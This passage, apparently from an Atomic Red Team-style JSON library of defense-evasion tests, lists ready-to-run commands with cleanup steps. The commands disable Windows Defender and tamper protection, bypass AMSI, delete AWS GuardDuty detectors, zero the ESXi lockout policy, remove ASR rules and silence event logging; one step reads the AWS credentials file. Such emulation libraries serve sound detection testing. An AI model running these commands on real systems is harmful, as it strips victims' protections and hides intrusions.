                            "cleanup_command": "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"EnableVirtualizationBasedSecurity\" /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"RequirePlatformSecurityFeatures\" /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"Locked\" /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Locked\" /f\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "AMSI Bypass - Override AMSI via COM",
                        "auto_generated_guid": "17538258-5699-4ff1-92d1-5ac9b0dc21f5",
                        "description": "With administrative rights, an adversary can disable AMSI via registry value in HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec} by overriding the Microsoft Defender COM object for AMSI and points it to a DLL that does not exist.\nThis is currently being used by AsyncRAT and others. \nhttps://strontic.github.io/xcyclopedia/library/clsid_fdb00e52-a214-4aa1-8fba-4357bb0072ec.html\nhttps://securitynews.sonicwall.com/xmlpost/asyncrat-variant-includes-cryptostealer-capabilites/\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "REG ADD HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32 /ve /t REG_SZ /d C:\\IDontExist.dll /f\n",
                            "cleanup_command": "REG DELETE HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32 /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "AWS - GuardDuty Suspension or Deletion",
                        "auto_generated_guid": "11e65d8d-e7e4-470e-a3ff-82bc56ad938e",
                        "description": "Enables GuardDuty in AWS, upon successful creation this test will suspend and then delete the GuardDuty configuration.\n",
                        "supported_platforms": [
                            "iaas:aws"
                        ],
                        "input_arguments": {
                            "region": {
                                "description": "Name of the specified region",
                                "type": "string",
                                "default": "us-east-1"
                            }
                        },
                        "dependency_executor_name": "bash",
                        "dependencies": [
                            {
                                "description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
                                "prereq_command": "cat ~/.aws/credentials | grep \"default\"\n",
                                "get_prereq_command": "echo \"Please install the aws-cli and configure your AWS default profile using: aws configure\"\n"
                            }
                        ],
                        "executor": {
                            "command": "detectorId=$(aws guardduty create-detector --enable --region \"#{region}\" | grep -oP '(?<=\"DetectorId\": \")[^\"]*')\naws guardduty update-detector --no-enable --detector-id $detectorId\naws guardduty delete-detector --detector-id $detectorId\n",
                            "cleanup_command": "echo \"If test successfully ran, no cleanup required.\"\n",
                            "name": "bash",
                            "elevation_required": false
                        }
                    },
                    {
                        "name": "Tamper with Defender ATP on Linux/MacOS",
                        "auto_generated_guid": "40074085-dbc8-492b-90a3-11bcfc52fda8",
                        "description": "With root privileges, an adversary can disable real time protection. Note, this test assumes Defender is not in passive mode and real-time protection is enabled. The use of a managed.json on Linux or Defender .plist on MacOS will prevent these changes. Tamper protection will also prevent this (available on MacOS, but not Linux at the time of writing). Installation of MDATP is a prerequisite. Installation steps vary across MacOS and Linux distros. See Microsoft public documentation for instructions: https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/mac-install-manually?view=o365-worldwide https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/linux-install-manually?view=o365-worldwide\n",
                        "supported_platforms": [
                            "linux",
                            "macos"
                        ],
                        "executor": {
                            "command": "sudo mdatp config real-time-protection --value disabled\n",
                            "cleanup_command": "sudo mdatp config real-time-protection --value enabled\n",
                            "name": "sh",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Tamper with Windows Defender Registry - Reg.exe",
                        "auto_generated_guid": "1f6743da-6ecc-4a93-b03f-dc357e4b313f",
                        "description": "Disable Windows Defender by tampering with windows defender registry using the utility \"reg.exe\"\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIntrusionPreventionSystem\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRoutinelyTakingAction\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScriptScanning\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f >NUL 2>nul \nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SpynetReporting\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\" /v \"DisallowExploitProtectionOverride\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\"  /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\software\\microsoft\\windows defender\\spynet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Microsoft\\Windows Defender\" /v \"PUAProtection\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\n",
                            "cleanup_command": "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIntrusionPreventionSystem\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRoutinelyTakingAction\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScriptScanning\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"0\" /f >NUL 2>nul \nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SpynetReporting\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\" /v \"DisallowExploitProtectionOverride\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\"  /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\software\\microsoft\\windows defender\\spynet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Microsoft\\Windows Defender\" /v \"PUAProtection\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Tamper with Windows Defender Registry - Powershell",
                        "auto_generated_guid": "a72cfef8-d252-48b3-b292-635d332625c3",
                        "description": "Disable Windows Defender by tampering with windows defender registry through powershell\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "Set-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiSpyware\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiVirus\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableBehaviorMonitoring\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIntrusionPreventionSystem\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIOAVProtection\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableOnAccessProtection\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRealtimeMonitoring\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRoutinelyTakingAction\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScanOnRealtimeEnable\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScriptScanning\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" -Name \"DisableEnhancedNotifications\" -Value 1  \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" -Name \"DisableBlockAtFirstSeen\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" -Name \"SpynetReporting\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" -Name \"MpEnablePus\" -Value 0 \nSet-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\" -Name \"DisallowExploitProtectionOverride\" -Value 0 \nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" -Name \"TamperProtection\"  -Value 0 \nSet-ItemProperty \"HKLM:\\software\\microsoft\\windows defender\\spynet\" -Name \"SubmitSamplesConsent\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows Defender\" -Name \"PUAProtection\" -Value 0 \n",
                            "cleanup_command": "Set-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiSpyware\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiVirus\" -Value 0\nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableBehaviorMonitoring\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIntrusionPreventionSystem\" -Value 0\nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIOAVProtection\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableOnAccessProtection\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRealtimeMonitoring\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRoutinelyTakingAction\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScanOnRealtimeEnable\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScriptScanning\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" -Name \"DisableEnhancedNotifications\" -Value 0  \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" -Name \"DisableBlockAtFirstSeen\" -Value 0\nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" -Name \"SpynetReporting\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" -Name \"MpEnablePus\" -Value 1 \nSet-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\" -Name \"DisallowExploitProtectionOverride\" -Value 1 \nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" -Name \"TamperProtection\"  -Value 1\nSet-ItemProperty \"HKLM:\\software\\microsoft\\windows defender\\spynet\" -Name \"SubmitSamplesConsent\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows Defender\" -Name \"PUAProtection\" -Value 1 \n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "ESXi - Disable Account Lockout Policy via PowerCLI",
                        "auto_generated_guid": "091a6290-cd29-41cb-81ea-b12f133c66cb",
                        "description": "An adversary may disable account lockout policy within ESXi to have the ability to prevent defensive actions from being enforced in the future or to prevent future alerting.\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "input_arguments": {
                            "vm_host": {
                                "description": "Specify the host name of the ESXi Server",
                                "type": "string",
                                "default": "atomic.local"
                            },
                            "vm_user": {
                                "description": "Specify the privilege user account on ESXi Server",
                                "type": "string",
                                "default": "root"
                            },
                            "vm_pass": {
                                "description": "Specify the privilege user password on ESXi Server",
                                "type": "string",
                                "default": "pass"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Check if VMWARE PowerCLI PowerShell Module is installed.\n",
                                "prereq_command": "$RequiredModule = Get-Module -Name VMware.PowerCLI -ListAvailable\nif (-not $RequiredModule) {exit 1}\n",
                                "get_prereq_command": "Install-Module -Name VMware.PowerCLI -Confirm:$false\n"
                            }
                        ],
                        "executor": {
                            "command": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \nConnect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}\nGet-AdvancedSetting -Entity #{vm_host} -Name 'Security.AccountLockFailures' | Set-AdvancedSetting -Value '0' -Confirm:$false\nDisconnect-VIServer -Confirm:$false\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Delete Microsoft Defender ASR Rules - InTune",
                        "auto_generated_guid": "eea0a6c2-84e9-4e8c-a242-ac585d28d0d1",
                        "description": "This test simulates the deletion of the ASR rules loaded by Microsoft Defender using the registry. Depending on the deployment, rules can be pushed either using GPO or InTune, This test simulates an InTune-based rules deployment.",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "$registryPath = \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager\"\n\nif (-not (Test-Path $registryPath)) {\n  New-Item -Path $registryPath -Force\n  Write-Host \"Registry key created: $registryPath\"\n}\n\n$registryValueName = \"ASRRules\"\n\nif (Test-Path \"$registryPath\\$registryValueName\") {\n  Remove-ItemProperty -Path $registryPath -Name $registryValueName\n  Write-Host \"Registry value deleted: $registryValueName\"\n} else {\n  New-ItemProperty -Path $registryPath -Name $registryValueName -PropertyType String -Value \"36190899-1602-49e8-8b27-eb1d0a1ce869=1\" -Force\n  Write-Host \"Registry value created: $registryValueName\"\n}\n\n\nRemove-ItemProperty -Path $registryPath -Name $registryValueName\nWrite-Host \"Registry value deleted: $registryValueName\"",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Delete Microsoft Defender ASR Rules - GPO",
                        "auto_generated_guid": "0e7b8a4b-2ca5-4743-a9f9-96051abb6e50",
                        "description": "This test simulates the deletion of the ASR rules loaded by Microsoft Defender using the registry. Depending on the deployment, rules can be pushed either using GPO or InTune, This test simulates a GPO-based rules deployment.",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "$registryPath = \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\ASR\\Rules\"\n\nif (-not (Test-Path $registryPath)) {\n    New-Item -Path $registryPath -Force\n    Write-Host \"Registry key created: $registryPath\"\n}\n\n$newValueName = \"36190899-1602-49e8-8b27-eb1d0a1ce869\"\n$newValueData = \"1\"\nNew-ItemProperty -Path $registryPath -Name $newValueName -PropertyType String -Value $newValueData -Force\nWrite-Host \"Registry value created: $newValueName with data $newValueData\"\n\nRemove-ItemProperty -Path $registryPath -Name $newValueName\nWrite-Host \"Registry value deleted: $newValueName\"",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "AMSI Bypass - Create AMSIEnable Reg Key",
                        "auto_generated_guid": "728eca7b-0444-4f6f-ac36-437e3d751dc0",
                        "description": "Threat Actor could disable the AMSI function by adding a registry value name “AmsiEnable” to the registry key “HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable” and set its value to 0.\nRef: https://mostafayahiax.medium.com/hunting-for-amsi-bypassing-methods-9886dda0bf9d\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "New-Item -Path \"HKCU:\\Software\\Microsoft\\Windows Script\\Settings\" -Force | Out-Null\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows Script\\Settings\" -Name \"AmsiEnable\" -Value 0 -PropertyType DWORD -Force | Out-Null\n",
                            "cleanup_command": "Remove-Item -Path \"HKCU:\\Software\\Microsoft\\Windows Script\\Settings\" -Recurse -Force 2> $null\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable EventLog-Application Auto Logger Session Via Registry - Cmd",
                        "auto_generated_guid": "653c6e17-14a2-4849-851d-f1c0cc8ea9ab",
                        "description": "This atomic simulates an activity where an attacker disables the EventLog-Application ETW Auto Logger session using the reg.exe utility to update the Windows registry value \"Start\". This would effectivly disable the Event log application channel. The changes would only take effect after a restart.",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application\" /v \"Start\" /t REG_DWORD /d \"0\" /f",
                            "cleanup_command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application\" /v \"Start\" /t REG_DWORD /d \"1\" /f",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable EventLog-Application Auto Logger Session Via Registry - PowerShell",
                        "auto_generated_guid": "da86f239-9bd3-4e85-92ed-4a94ef111a1c",
                        "description": "This atomic simulates an activity where an attacker disables the EventLog-Application ETW Auto Logger session using the powershell.exe \"New-ItemProperty\" cmdlet to update the Windows registry value \"Start\". This would effectivly disable the Event log application channel. The changes would only take effect after a restart.",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "New-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application -Name Start -Value 0 -PropertyType \"DWord\" -Force",
                            "cleanup_command": "New-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application -Name Start -Value 1 -PropertyType \"DWord\" -Force",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable EventLog-Application ETW Provider Via Registry - Cmd",
                        "auto_generated_guid": "1cac9b54-810e-495c-8aac-989e0076583b",
                        "description": "This atomic simulates an activity where an attacker disables a specific ETW provider from the EventLog-Application ETW Auto Logger session using the reg.exe utility to update the Windows registry value \"Enabled\". This would effectivly remove that provider from the session and cause to not emit any logs of that type. The changes would only take effect after a restart.",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "ETWProviderGUID": {
                                "type": "string",
                                "default": "{B6D775EF-1436-4FE6-BAD3-9E436319E218}",
                                "description": "Microsoft-Windows-SenseIR ETW Provider GUID"
                            }
                        },
                        "executor": {
                            "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application\\#{ETWProviderGUID}\" /v \"Enabled\" /t REG_DWORD /d \"0\" /f",
                            "cleanup_command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application\\#{ETWProviderGUID}\" /v \"Enabled\" /t REG_DWORD /d \"1\" /f",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable EventLog-Application ETW Provider Via Registry - PowerShell",
                        "auto_generated_guid": "8f907648-1ebf-4276-b0f0-e2678ca474f0",
                        "description": "This atomic simulates an activity where an attacker disables a specific ETW provider from the EventLog-Application ETW Auto Logger session using the powershell.exe \"New-ItemProperty\" cmdlet to update the Windows registry value \"Enabled\". This would effectivly remove that provider from the session and cause to not emit any logs of that type. The changes would only take effect after a restart.",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "ETWProviderGUID": {
                                "type": "string",
                                "default": "{B6D775EF-1436-4FE6-BAD3-9E436319E218}",
                                "description": "Microsoft-Windows-SenseIR ETW Provider GUID"
                            }
                        },
                        "executor": {
                            "command": "New-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application\\#{ETWProviderGUID}\" -Name Enabled -Value 0 -PropertyType \"DWord\" -Force",
                            "cleanup_command": "New-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application\\#{ETWProviderGUID}\" -Name Enabled -Value 1 -PropertyType \"DWord\" -Force",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 16:40:58"
}